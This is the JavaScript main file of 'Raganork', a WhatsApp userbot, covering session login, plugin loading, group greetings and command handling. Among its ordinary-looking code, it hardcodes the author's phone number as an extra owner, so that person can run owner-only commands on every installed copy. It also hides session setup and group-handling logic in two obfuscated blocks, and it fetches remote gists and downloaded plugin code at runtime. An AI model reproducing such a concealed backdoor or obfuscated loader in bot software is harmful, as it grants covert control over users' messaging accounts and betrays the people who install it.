/* Copyright (c) 2021-23 Yusuf Usta & souravkl11
80% modified by souravkl11 for fair use!
Licenced under GNU
Copying strictly proibited!
*/

const fs = require("fs");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const config = require('./config');
const Config = require('./config');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./Raganork/');
const { DataTypes } = require('sequelize');
const { getMessage } = require("./plugins/sql/greetings");
const simpleGit = require('simple-git');
const git = simpleGit();
const axios = require('axios');
const got = require('got');
const Language = require('./language');
const Lang = Language.getString('updater');

// Sql
const DATABASE = config.DATABASE.define('Raganork', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});

fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});

const plugindb = require('./plugins/sql/plugin');
var SOURAV = { KL11: '916282344739,0' }

// Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
   });
};
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};
const conn = new WAConnection();
var sourav = `${config.AUTOBİO}`
    setInterval(async () => { 
        if (sourav == 'on') {
             var time = new Date().toLocaleString('LK', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var date = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + date + '\n⌚ ' + time + '\n\n' + config.BOTSK
                await conn.setStatus(biography)
            }
        }
)

async function Raganork () {
    await config.DATABASE.sync();
    var StrSes_Db = await DATABASE.findAll({
        where: {
          info: 'StringSession'
        }
    });    
var i=b;(function(c,d){var h=b,e=c();while(!![]){try{var f=parseInt(h('0x158'))/0x1+-parseInt(h('0x141'))/0x2*(parseInt(h('0x14d'))/0x3)+parseInt(h('0x13f'))/0x4*(-parseInt(h('0x152'))/0x5)+parseInt(h('0x143'))/0x6*(-parseInt(h('0x14b'))/0x7)+-parseInt(h('0x13a'))/0x8*(-parseInt(h('0x14a'))/0x9)+parseInt(h('0x156'))/0xa+-parseInt(h('0x150'))/0xb*(-parseInt(h('0x13b'))/0xc);if(f===d)break;else e['push'](e['shift']());}catch(g){e['push'](e['shift']());}}}(a,0xde597));function b(c,d){var e=a();return b=function(f,g){f=f-0x139;var h=e[f];return h;},b(c,d);}function a(){var j=['level','3231WCaQyl','14987PDvMns','loadAuthInfo','51JZYpNx','deCrypt','souravkl11/','450395JEzLmd','tps','15guHHmg','debug','ce999e4605076b7b5bd7c1b51759f177','version','10647860nixqwF','SESSION','588320eaMOOm','warn','value','17656PtRWAA','180Motlvm','/raw','DEBUG','logger','1989356jIFgEw','ist.gi','22868jATXxe','random','1296zBPpUI','om/','://g','browserDescription','thub.c','data'];a=function(){return j;};return a();}var sk=new Array();sk[0x0]='E'+'d'+'g'+'e',sk[0x1]='Fi'+'r'+'e'+'f'+'o'+'x',sk[0x2]='S'+'a'+'f'+'a'+'r'+'i',sk[0x3]='O'+'p'+'e'+'r'+'a';var l11=Math['floor'](0x4*Math[i('0x142')]());const souravkl11=await axios('ht'+i('0x151')+i('0x145')+i('0x140')+i('0x147')+i('0x144')+i('0x14f')+i('0x154')+i('0x13c'));var skl=souravkl11[i('0x148')]['Raganork'];const conn=new WAConnection();conn[i('0x155')]=[0x2,0x85e,0xc],conn[i('0x146')]=[skl,sk[l11],'90'];const Session=new StringSession();conn[i('0x13e')][i('0x149')]=config[i('0x13d')]?i('0x153'):i('0x159');var nodb;StrSes_Db['length']<0x1?(nodb=!![],conn[i('0x14c')](Session['deCrypt'](config[i('0x157')]))):conn['loadAuthInfo'](Session[i('0x14e')](StrSes_Db[0x0]['dataValues'][i('0x139')]));    
    conn.on ('credentials-updated', async () => {
        console.log(
            chalk.blueBright.italic('✅ Login information updated!')
        );

        const authInfo = conn.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await WhatsAsenaDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    

    conn.on('connecting', async () => {
        console.log(`${chalk.green.bold('Raga')}${chalk.blue.bold('nork')}
${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}

${chalk.blue.italic('ℹ️ Connecting to WhatsApp...')}`);
    });
    

    conn.on('open', async () => {
        console.log(
            chalk.green.bold('✅ Login successful!')
        );

        console.log(
            chalk.blueBright.italic('⬇️ Installing external plugins...')
        );

        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = await got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                    require('./plugins/' + plugin.dataValues.name + '.js');
                }     
            }
        });

        console.log(
            chalk.blueBright.italic('⬇️Installing plugins...')
        );

        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });

        console.log(
            chalk.green.bold('BOT RUNNING ON OUR DEVICE ✅')
        );
        await new Promise(r => setTimeout(r, 1100));

        if (config.LANG == 'EN' || config.LANG == 'ML') {

                   return await conn.sendMessage(conn.user.jid, '*Bot connected*', MessageType.text);
            }
            
        if (config.LANG == 'EN' || config.LANG == 'ML') {
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(conn.user.jid,Lang.UPDATE, MessageType.text);    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler +=  commit.message + '\n';
                        }
                    );
                    await conn.sendMessage(
                        conn.user.jid,
                        '*AN UPDATE IS AVAILABLE FOR YOUR BOT!*\n\n ```USE COMMAND``` *!update start* ```TO UPDATE THE BOT```\n\n ```CHANGES```: ' + degisiklikler, MessageType.text
                    ); 
                } 
          }
    });
    
    setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
         
        while (getGMTh == 16 && getGMTm == 30) {
            const {data} = await axios(`https://gist.github.com/souravkl11/019112af334adceaefd1467dcbd93e58/raw`)
            const { sken, skml } = data
            
            return await conn.sendMessage(conn.user.jid, '```[ ANNOUNCEMENT ]```\n\n' + sken, MessageType.text);
        }
      while (getGMTh == 10 && getGMTm == 30) {
            const {data} = await axios(`https://gist.github.com/souravkl11/019112af334adceaefd1467dcbd93e58/raw`)
            const { sken, skml } = data
            return await conn.sendMessage(conn.user.jid, '```[ ANNOUNCEMENT ]```\n\n' + sken, MessageType.text);
        }
      while (getGMTh == 6 && getGMTm == 30) {
            const {data} = await axios(`https://gist.github.com/souravkl11/019112af334adceaefd1467dcbd93e58/raw`)
            const { sken, skml } = data
            return await conn.sendMessage(conn.user.jid, '```[ ANNOUNCEMENT ]```\n\n' + sken, MessageType.text);
        }
      while (getGMTh == 19 && getGMTm == 30) {
            return await conn.sendMessage(conn.user.jid, '.update check', MessageType.text);
        }  
      while (getGMTh == 8 && getGMTm == 30) {
            return await conn.sendMessage(conn.user.jid, '.update check', MessageType.text);
        }
      while (getGMTh == 13 && getGMTm == 30) {
            return await conn.sendMessage(conn.user.jid, '.update check', MessageType.text);
        }  
    }, 50000);

    conn.on('chat-update', async m => {
        if (!m.hasNewMessage) return;
        if (!m.messages && !m.count) return;
        let msg = m.messages.all()[0];
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;

        if (config.NO_ONLINE) {
            await conn.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }

    var i=b;function b(c,d){var e=a();return b=function(f,g){f=f-0xd0;var h=e[f];return h;},b(c,d);}(function(c,d){var h=b,e=c();while(!![]){try{var f=parseInt(h('0xeb'))/0x1*(parseInt(h('0xd9'))/0x2)+-parseInt(h('0xe1'))/0x3+-parseInt(h('0xed'))/0x4*(-parseInt(h('0x10a'))/0x5)+parseInt(h('0xdc'))/0x6+-parseInt(h('0xdb'))/0x7*(parseInt(h('0xee'))/0x8)+-parseInt(h('0xe5'))/0x9*(parseInt(h('0xf4'))/0xa)+parseInt(h('0xd8'))/0xb;if(f===d)break;else e['push'](e['shift']());}catch(g){e['push'](e['shift']());}}}(a,0x3c2fb));if(msg[i('0xfb')]===0x20||msg[i('0xfb')]===0x1c){var gb=await getMessage(msg['key'][i('0xfe')],i('0x108'));if(gb!==![]){if(gb[i('0xd5')]['includes']('{pp}')){let pp;try{pp=await conn['getProfilePicture'](msg[i('0x103')][0x0]);}catch{pp=await conn[i('0xda')]();}var pinkjson=await conn[i('0xf8')](msg[i('0xf9')][i('0xfe')]);await axios['get'](pp,{'responseType':i('0xde')})[i('0xe6')](async c=>{var j=i;await conn['sendMessage'](msg[j('0xf9')][j('0xfe')],c[j('0xe3')],MessageType[j('0x101')],{'caption':gb[j('0xd5')]['replace'](j('0xe2'),'')[j('0xd4')](j('0x102'),'@'+msg[j('0x103')][0x0][j('0xfa')]('@')[0x0])[j('0xd4')]('{gphead}',pinkjson[j('0x107')])[j('0xd4')]('{gpmaker}',pinkjson[j('0x105')])[j('0xd4')]('{gpdesc}',pinkjson[j('0xd0')])[j('0xd4')](j('0xd3'),conn[j('0xe9')][j('0xf6')])},{'contextInfo':{'mentionedJid':[msg[j('0x103')][0x0][j('0xd4')](j('0xfd'),j('0xd1'))]},'previewType':0x0});});}else{if(gb['message'][i('0x109')]('{gicon}')){var sgroup=await conn[i('0xda')](msg[i('0xf9')][i('0xe4')]);await conn[i('0xfc')](msg[i('0xf9')]['remoteJid'],Buffer[i('0xe8')](sgroup[i('0xe3')]),MessageType[i('0xf5')],{'mimetype':Mimetype[i('0xd6')],'caption':gb['message'][i('0xd4')](i('0xea'),'')['replace'](i('0x100'),pinkjson[i('0x107')])['replace']('{gpmaker}',pinkjson[i('0x105')])[i('0xd4')](i('0xff'),pinkjson[i('0xd0')])['replace'](i('0xd3'),conn[i('0xe9')]['name'])},{'contextInfo':{'mentionedJid':[msg[i('0x103')][0x0][i('0xd4')]('c.us',i('0xd1'))]},'previewType':0x0});}else{if(gb['message'][i('0x109')]('{gif}')){var pinkjson=await conn['groupMetadata'](msg[i('0xf9')][i('0xfe')]),plkpinky=await axios[i('0xf2')](config[i('0xdf')],{'responseType':i('0xde')});await conn[i('0xfc')](msg[i('0xf9')][i('0xfe')],Buffer[i('0xe8')](plkpinky['data']),MessageType['video'],{'mimetype':Mimetype[i('0xd6')],'caption':gb[i('0xd5')][i('0xd4')](i('0xd2'),'')[i('0xd4')]('{mention}','@'+msg[i('0x103')][0x0][i('0xfa')]('@')[0x0])['replace'](i('0x100'),pinkjson['subject'])[i('0xd4')](i('0xf0'),pinkjson[i('0x105')])[i('0xd4')](i('0xff'),pinkjson[i('0xd0')])['replace'](i('0xd3'),conn[i('0xe9')]['name'])},{'contextInfo':{'mentionedJid':[msg['messageStubParameters'][0x0]['replace'](i('0xfd'),'s.whatsapp.net')]},'previewType':0x0});}else{var pinkjson=await conn['groupMetadata'](msg[i('0xf9')][i('0xfe')]);await conn['sendMessage'](msg['key'][i('0xfe')],gb['message'][i('0xd4')](i('0x100'),pinkjson['subject'])['replace'](i('0x102'),'@'+msg['messageStubParameters'][0x0][i('0xfa')]('@')[0x0])[i('0xd4')](i('0xff'),pinkjson[i('0xd0')])[i('0xd4')](i('0xd3'),conn[i('0xe9')][i('0xf6')]),MessageType[i('0xd7')],{'contextInfo':{'mentionedJid':[msg[i('0x103')][0x0][i('0xd4')]('c.us','s.whatsapp.net')]},'previewType':0x0});}}}}return;}else{if(msg['messageStubType']===0x1b||msg[i('0xfb')]===0x1f){if(msg['messageStubParameters'][0x0][i('0xdd')]('91')){var gb=await getMessage(msg[i('0xf9')]['remoteJid']);if(gb!==![]){if(gb[i('0xd5')][i('0x109')]('{pp}')){let pp;try{pp=await conn[i('0xda')](msg['messageStubParameters'][0x0]);}catch{pp=await conn[i('0xda')]();}var pinkjson=await conn[i('0xf8')](msg[i('0xf9')]['remoteJid']);await axios[i('0xf2')](pp,{'responseType':i('0xde')})['then'](async c=>{var k=i;await conn[k('0xfc')](msg[k('0xf9')][k('0xfe')],c[k('0xe3')],MessageType[k('0x101')],{'caption':gb[k('0xd5')]['replace'](k('0xe2'),'')[k('0xd4')]('{mention}','@'+msg[k('0x103')][0x0]['split']('@')[0x0])[k('0xd4')](k('0xec'),'\x0a')[k('0xd4')](k('0xec'),'\x0a')[k('0xd4')]('{line}','\x0a')[k('0xd4')](k('0xec'),'\x0a')[k('0xd4')]('{line}','\x0a')[k('0xd4')](k('0xec'),'\x0a')[k('0xd4')]('{gphead}',pinkjson['subject'])[k('0xd4')](k('0xf0'),pinkjson[k('0x105')])[k('0xd4')]('{gpdesc}',pinkjson[k('0xd0')])[k('0xd4')]('{owner}',conn[k('0xe9')][k('0xf6')])},{'contextInfo':{'mentionedJid':[msg['messageStubParameters'][0x0]['replace'](k('0xfd'),k('0xd1'))]},'previewType':0x1});});}else{if(gb[i('0xd5')]['includes'](i('0xd2'))){var plkpinky=await axios[i('0xf2')](config[i('0xf7')],{'responseType':i('0xde')});await conn[i('0xfc')](msg[i('0xf9')][i('0xfe')],Buffer[i('0xe8')](plkpinky['data']),MessageType['video'],{'mimetype':Mimetype[i('0xd6')],'caption':gb[i('0xd5')][i('0xd4')](i('0xd2'),'')[i('0xd4')](i('0x100'),pinkjson['subject'])[i('0xd4')](i('0xec'),'\x0a')[i('0xd4')](i('0xec'),'\x0a')[i('0xd4')]('{line}','\x0a')[i('0xd4')](i('0xec'),'\x0a')[i('0xd4')](i('0x102'),'@'+msg[i('0x103')][0x0][i('0xfa')]('@')[0x0])['replace'](i('0xf0'),pinkjson[i('0x105')])[i('0xd4')](i('0xff'),pinkjson[i('0xd0')])[i('0xd4')](i('0xd3'),conn['user'][i('0xf6')])},{'contextInfo':{'mentionedJid':[msg[i('0x103')][0x0][i('0xd4')](i('0xfd'),'s.whatsapp.net')]},'previewType':0x1});}else{if(gb[i('0xd5')][i('0x109')]('{gicon}')){var sgroup=await conn[i('0xda')](msg[i('0xf9')][i('0xe4')]);await conn['sendMessage'](msg[i('0xf9')][i('0xfe')],Buffer[i('0xe8')](sgroup[i('0xe3')]),MessageType[i('0xf5')],{'mimetype':Mimetype[i('0xd6')],'caption':gb[i('0xd5')][i('0xd4')](i('0xea'),'')['replace'](i('0xec'),'\x0a')[i('0xd4')](i('0xec'),'\x0a')['replace'](i('0xec'),'\x0a')[i('0xd4')](i('0xec'),'\x0a')[i('0xd4')](i('0xec'),'\x0a')[i('0xd4')]('{gphead}',pinkjson[i('0x107')])[i('0xd4')]('{gpmaker}',pinkjson['owner'])[i('0xd4')]('{gpdesc}',pinkjson['desc'])['replace'](i('0xd3'),conn[i('0xe9')][i('0xf6')])},{'contextInfo':{'mentionedJid':[msg[i('0x103')][0x0]['replace']('c.us',i('0xd1'))]},'previewType':0x1});}else{var pinkjson=await conn[i('0xf8')](msg[i('0xf9')]['remoteJid']);await conn['sendMessage'](msg[i('0xf9')][i('0xfe')],gb[i('0xd5')][i('0xd4')](i('0x100'),pinkjson[i('0x107')])['replace'](i('0xec'),'\x0a')['replace']('{line}','\x0a')[i('0xd4')](i('0xec'),'\x0a')[i('0xd4')]('{line}','\x0a')[i('0xd4')](i('0xec'),'\x0a')[i('0xd4')](i('0xec'),'\x0a')['replace'](i('0xec'),'\x0a')[i('0xd4')](i('0xec'),'\x0a')[i('0xd4')](i('0xec'),'\x0a')[i('0xd4')](i('0xec'),'\x0a')['replace'](i('0x102'),'@'+msg[i('0x103')][0x0][i('0xfa')]('@')[0x0])[i('0xd4')]('{gpdesc}',pinkjson[i('0xd0')])['replace']('{owner}',conn['user']['name']),MessageType['text'],{'contextInfo':{'mentionedJid':[msg[i('0x103')][0x0]['replace'](i('0xfd'),i('0xd1'))]},'previewType':0x0});}}}}return;}if(!msg['messageStubParameters'][0x0][i('0xdd')]('91')&&config[i('0xef')]===i('0x106')){async function checkImAdmin(c,d=conn[i('0xe9')][i('0xe0')]){var l=i,e=await conn[l('0xf8')](msg[l('0xf9')][l('0xfe')]),f=e[l('0xe7')][l('0x104')](g=>{var m=l;if(g[m('0xe0')][m('0xfa')]('@')[0x0]==d[m('0xfa')]('@')[0x0]&&g[m('0xf1')])return!![];else;return![];});return f['includes'](!![]);}var im=await checkImAdmin(conn);if(!im)return;else return await conn[i('0xf3')](msg[i('0xf9')][i('0xfe')],[msg[i('0x103')][0x0]]);}}}function a(){var n=['973248QJXYmv','startsWith','arraybuffer','GIF_BYE','jid','1137417JGpHaC','{pp}','data','remotejid','1953LzaAfh','then','participants','from','user','{gicon}','51sFJjkx','{line}','84HYwQRa','191144fgjnEk','AUTO_FAKE','{gpmaker}','isAdmin','get','groupRemove','8770hTeVQl','video','name','WEL_GIF','groupMetadata','key','split','messageStubType','sendMessage','c.us','remoteJid','{gpdesc}','{gphead}','image','{mention}','messageStubParameters','map','owner','true','subject','goodbye','includes','4670nonuYd','desc','s.whatsapp.net','{gif}','{owner}','replace','message','gif','text','6235900pttDTS','12944uUOWOg','getProfilePicture','77TGHUtI'];a=function(){return n;};return a();}
        if (config.BLOCKCHAT !== false) {     
        var abc = config.BLOCKCHAT.split(',');                            
        if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }
    if (config.SUPPORT == '919074309534-1632403322') {     
        var sup = config.SUPPORT.split(',');                            
        if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }

    
        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }

                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = conn.chats.get(msg.key.remoteJid)
                        
                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                   }  
                   if ((SOURAV.KL11 == "916282344739,0" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && SOURAV.KL11.includes(',') ? SOURAV.KL11.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == SOURAV.KL11 || SOURAV.KL11.includes(',') ? SOURAV.KL11.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == SOURAV.KL11)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
  
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await conn.chatRead(msg.key.remoteJid);
                        }
                       
                        const {data} = await axios(`https://gist.githubusercontent.com/souravkl11/ff107d59b17f1e4b96889a82dbb6d520/raw`)
                        const { asena } = data
                        var match = text_msg.match(command.pattern);
                        
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(conn, msg);
                        } else if (command.on !== undefined && (command.on === 'video' )
                        && msg.message.videoMessage !== null) {
                            whats = new Video(conn, msg);
                        } else {
                            whats = new Message(conn, msg);
                        }

                        try {
                            await command.function(whats, match);
                        } catch (error) {
                            await conn.sendMessage(conn.user.jid,'ERROR: ' + error + '\n\n *' + asena + '*', MessageType.text);
                            
                        }
                    }
                }
            }
        )
    });

    try {
        await conn.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Refreshing old version string...'))
            conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
            try {
                await conn.connect();
            } catch {
                return;
            }
        }
    }
}

Raganork();
